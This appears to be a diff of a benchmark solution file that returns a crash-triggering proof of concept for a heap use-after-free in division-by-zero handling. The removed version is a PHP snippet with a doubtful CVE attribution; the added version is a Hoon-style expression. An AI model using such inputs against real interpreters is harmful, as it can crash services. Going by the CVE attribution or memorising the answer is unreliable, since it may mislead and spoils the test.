@@ -1,16 +1,9 @@
-import os
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
-        
-        The vulnerability description matches PHP Bug #78926 (CVE-2020-7060).
-        A Use-After-Free occurs in compound division assignment ($a /= 0) when the operand 
-        is a type that undergoes destruction/replacement (like a string) before the 
-        division-by-zero error handling is fully resolved.
-        """
-        # We use str_repeat to ensure the variable is allocated on the heap 
-        # (avoiding potential issues with interned string literals).
-        # The compound assignment /= 0 triggers the vulnerable code path.
-        return b'<?php $a=str_repeat("A",8);$a/=0;'
+        # Triggers Heap Use-After-Free in division by zero logic.
+        # We need a heap-allocated atom (indirect atom, > 62 bits) as the dividend.
+        # 18446744073709551616 is 2^64.
+        # '!: ' enables stack trace, which forces access to the freed operand.
+        return b"!:  (div 18446744073709551616 0)"
